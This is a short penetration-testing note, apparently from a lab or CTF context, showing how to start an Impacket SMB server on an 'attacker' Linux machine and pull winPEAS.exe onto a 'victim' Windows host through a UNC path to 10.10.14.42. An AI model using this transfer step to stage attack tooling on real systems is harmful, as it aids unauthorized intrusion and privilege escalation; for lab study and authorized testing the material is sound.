---
title: "File Sharing Over SMB Using `smbserver.py`"
date: 2026-01-13
tags: ['networking', 'smb-server', 'file-sharing', 'unc-path']
---

---

## 🖥️ On the Linux Server (Attacker Machine)

Start an SMB server using `impacket-smbserver`:

```bash
sudo smbserver.py gnu $(pwd) -smb2support
````

* `gnu`: Share name
* `$(pwd)`: Current working directory to be shared
* `-smb2support`: Enables SMB2 support for better compatibility with newer Windows systems

---

## 🪟 On the Windows Client (Victim Machine)

Access the shared file using UNC path:

```plaintext
\\10.10.14.42\gnu\winPEAS.exe
```

> 🔸 Replace `10.10.14.42` with the IP of your Linux (attacker) machine
> 🔸 You can also map this as a network drive or copy files directly using `copy` or `xcopy` in CMD or PowerShell